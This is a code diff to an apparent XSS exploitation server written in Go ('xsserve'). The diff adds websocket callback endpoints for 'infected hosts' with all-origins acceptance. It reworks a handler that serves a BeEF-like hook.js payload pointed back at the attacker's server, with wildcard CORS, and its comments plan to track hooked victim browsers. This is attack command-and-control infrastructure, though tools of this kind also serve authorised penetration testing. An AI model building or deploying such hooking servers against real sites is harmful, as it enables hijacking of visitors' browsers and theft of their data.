@@ -18,9 +18,17 @@ import (
 	"strings"
 	"time"
 
+	"github.com/gorilla/websocket"
+
 	"xsserve/core"
 	"xsserve/database"
 )
+
+var upgrader = websocket.Upgrader{
+    ReadBufferSize:  512,
+    WriteBufferSize: 512,
+	CheckOrigin: func(r *http.Request) bool { return true }, // should eventually fix this to loop over allowed origins, AKA, triggered hooks hosts. To only allow infected hosts to call back. true for true YOLOers
+}
 
 func ServeXSS(currentFlags *core.Flags) (err error) {
 	flags = currentFlags
@@ -31,13 +39,16 @@ func ServeXSS(currentFlags *core.Flags) (err error) {
 	//mux.Handle("/foo", rh)
 	//notFoundHandler := http.NotFoundHandler()
 	hook := http.HandlerFunc(hookHandle)
+	hookws := http.HandlerFunc(hookWSHandle)
 	blind := http.HandlerFunc(blindHandle)
 	custom := http.HandlerFunc(customHandle)
 	api := http.HandlerFunc(apiHandle)
 
-	// Beef-like hook payload
+	// Beef-like hook payload and endpoint
 	mux.Handle("/hook", hook)
 	mux.Handle("/h", hook)
+	mux.Handle("/ws", hookws) //web socket endpoint
+	mux.Handle("/w", hookws)
 
 	// Blind XSS payload
 	mux.Handle("/blind", blind)
@@ -102,54 +113,62 @@ func ServeXSS(currentFlags *core.Flags) (err error) {
 	return err
 }
 
-func hookHandle(w http.ResponseWriter, r *http.Request) {
-	log.Println("[HOOK] Received request from", r.Host)
+func hookWSHandle(w http.ResponseWriter, r *http.Request) {
+	conn, err := upgrader.Upgrade(w, r, nil) // error ignored for sake of simplicity
+	if err != nil {
+		log.Println(err)
+	}
 
-	if r.Method == "GET" {
-		w.Header().Set("Access-Control-Allow-Origin", "*")
-		w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
-		w.Header().Set("Content-type", "text/javascript")
-		hook, err := StaticFS.ReadFile("resources/xss/hook.js")
+	//TODO: set online everytime we receive an heartbeat, if not heartbeat for more than X duration, its dead.
+	//TODO: also have a page for "infected browsers" instead of just triggers? Like beef?
+	//TODO: if same browser fingerprint matches, then reestablish existing connection?
+	for {
+		// Read message from browser
+		msgType, msg, err := conn.ReadMessage()
 		if err != nil {
-			log.Println("Could not locate hook.js file:", err)
-			log.Println(r)
 			return
 		}
 
-		var protocol, endpoint string
-		protocol = "http"
-		if flags.IsHTTPS {
-			protocol = "https"
-		}
-		endpoint = flags.XSSAddress
-		if flags.Domain != "" {
-			endpoint = flags.Domain
-		}
-		hook = bytes.ReplaceAll(hook, []byte("[[HOST_REPLACE_ME]]"), []byte(fmt.Sprintf("%v://%v:%v", protocol, endpoint, flags.XSSPort)))
+		// Print the message to the console
+		fmt.Printf("%s sent: %s\n", conn.RemoteAddr(), string(msg))
 
-		_, err = w.Write(hook)
-		if err != nil {
-			log.Println("Failed to write response:", err)
+		// Write message back to browser
+		if err = conn.WriteMessage(msgType, msg); err != nil {
+			return
 		}
+	}
+}
+
+func hookHandle(w http.ResponseWriter, r *http.Request) {
+	log.Println("[HOOK] Received request from", r.Host)
+
+	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
+	w.Header().Set("Content-type", "text/javascript")
+	hook, err := StaticFS.ReadFile("resources/xss/hook.js")
+	if err != nil {
+		log.Println("Could not locate hook.js file:", err)
+		log.Println(r)
 		return
 	}
 
-	if r.Method == "POST" {
-		w.Header().Set("Access-Control-Allow-Origin", "*")
-		w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
-		w.Header().Set("Content-type", "text/javascript")
-
-		//if POST parse json and check:
-		//probe REQ: {"poll":"hearthbeat", "id":"id", "action_results":[]} //todo change ID to GUID to reduce likelihood of guessing the ID
-		//server RES: if actions available {"actions": {"action1":["options1"],"action2":["options2"]}}
-		
-		//if POST parse json and check:
-		//probe REQ: {"action_results":{"action1":{results},"action2":{results}}}}
-		//server RES: {"status":"ok"} || {"status":"error"}
-
-
-		return
+	var protocol, endpoint string
+	protocol = "http"
+	if flags.IsHTTPS {
+		protocol = "https"
 	}
+	endpoint = flags.XSSAddress
+	if flags.Domain != "" {
+		endpoint = flags.Domain
+	}
+	hook = bytes.ReplaceAll(hook, []byte("[[HOST_REPLACE_ME]]"), []byte(fmt.Sprintf("%v://%v:%v", protocol, endpoint, flags.XSSPort)))
+
+	_, err = w.Write(hook)
+	if err != nil {
+		log.Println("Failed to write response:", err)
+	}
+	return
+	
 }
 
 func blindHandle(w http.ResponseWriter, r *http.Request) {
